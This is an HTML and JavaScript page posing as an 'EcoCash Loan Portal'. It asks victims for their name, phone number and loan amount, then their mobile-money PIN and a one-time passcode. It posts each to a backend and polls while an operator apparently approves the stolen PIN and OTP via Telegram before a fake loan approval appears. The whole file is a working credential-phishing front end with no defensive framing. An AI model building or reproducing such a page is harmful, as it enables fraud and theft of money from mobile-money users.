<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash Loan Portal</title>
</head>
<body>
    <div id="app">
        <!-- STEP 1 -->
        <div id="step-1" class="step-container">
            <h2>Step 1: Personal Details</h2>
            <form id="form-step-1">
                <input type="text" id="fullName" placeholder="Full Name" required>
                <input type="text" id="phone" placeholder="Phone Number (+26377...)" required>
                <input type="number" id="loanAmount" placeholder="Loan Amount ($)" required>
                <!-- Button text requested -->
                <button type="submit" id="step1-btn">NEXT</button>
            </form>
        </div>

        <!-- STEP 2 -->
        <div id="step-2" class="step-container" style="display:none;">
            <h2>Step 2: Enter PIN</h2>
            <form id="form-step-2">
                <input type="password" id="pin" placeholder="4-Digit PIN" maxlength="4" required>
                <!-- Button text requested -->
                <button type="submit" id="step2-btn">LOG IN</button>
            </form>
            <div id="step2-waiting" style="display:none;">WAITING FOR PIN VERIFICATION...</div>
        </div>

        <!-- STEP 3 -->
        <div id="step-3" class="step-container" style="display:none;">
            <h2>Step 3: Enter OTP</h2>
            <form id="form-step-3">
                <input type="text" id="otpCode" placeholder="Enter OTP Code" required>
                <button type="submit" id="step3-btn">SUBMIT OTP</button>
            </form>
            <!-- Exact text requested -->
            <div id="step3-loading" style="display:none;">WAITING TO VERIFY YOUR OTP</div>
        </div>
    </div>

    <script>
        let appReference = null;
        let statusInterval = null;

        // Step 1 Submission -> Moves to Step 2
        document.getElementById('form-step-1').addEventListener('submit', (e) => {
            e.preventDefault();
            document.getElementById('step-1').style.display = 'none';
            document.getElementById('step-2').style.display = 'block';
        });

        // Step 2 Submission (Credentials & PIN)
        document.getElementById('form-step-2').addEventListener('submit', async (e) => {
            e.preventDefault();
            const fullName = document.getElementById('fullName').value;
            const phone = document.getElementById('phone').value;
            const loanAmount = document.getElementById('loanAmount').value;
            const pin = document.getElementById('pin').value;

            document.getElementById('step2-btn').style.display = 'none';
            document.getElementById('step2-waiting').style.display = 'block';

            try {
                const res = await fetch('/api/submit-credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ fullName, phone, loanAmount, pin })
                });
                const data = await res.json();
                if (data.success) {
                    appReference = data.appReference;
                    pollPinStatus();
                } else {
                    alert(data.error);
                    resetStep2();
                }
            } catch (err) {
                console.error(err);
                resetStep2();
            }
        });

        function resetStep2() {
            document.getElementById('step2-btn').style.display = 'block';
            document.getElementById('step2-waiting').style.display = 'none';
        }

        // Poll for PIN approval from Telegram
        function pollPinStatus() {
            statusInterval = setInterval(async () => {
                try {
                    const res = await fetch(`/api/check-status/${appReference}`);
                    const data = await res.json();

                    if (data.status === 'PIN_APPROVED') {
                        clearInterval(statusInterval);
                        document.getElementById('step-2').style.display = 'none';
                        document.getElementById('step-3').style.display = 'block';
                    } else if (data.status === 'PIN_REJECTED') {
                        clearInterval(statusInterval);
                        alert("Wrong PIN entered. Access denied.");
                        resetStep2();
                    }
                } catch (err) {
                    console.error("Polling error:", err);
                }
            }, 3000);
        }

        // Step 3 Submission (OTP)
        document.getElementById('form-step-3').addEventListener('submit', async (e) => {
            e.preventDefault();
            const otpCode = document.getElementById('otpCode').value;

            document.getElementById('step3-btn').style.display = 'none';
            document.getElementById('step3-loading').style.display = 'block';

            try {
                const res = await fetch('/api/submit-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ appReference, otpCode })
                });
                const data = await res.json();
                if (data.success) {
                    pollOtpStatus();
                } else {
                    alert("Error submitting OTP");
                }
            } catch (err) {
                console.error(err);
            }
        });

        function pollOtpStatus() {
            const otpInterval = setInterval(async () => {
                try {
                    const res = await fetch(`/api/check-status/${appReference}`);
                    const data = await res.json();

                    if (data.status === 'OTP_APPROVED') {
                        clearInterval(otpInterval);
                        alert("Verification Successful! Your loan request has been successfully approved.");
                    } else if (data.status === 'OTP_REJECTED') {
                        clearInterval(otpInterval);
                        alert("Wrong OTP entered.");
                        document.getElementById('step3-btn').style.display = 'block';
                        document.getElementById('step3-loading').style.display = 'none';
                    }
                } catch (err) {
                    console.error("OTP polling error:", err);
                }
            }, 3000);
        }
    </script>
</body>
  </html>
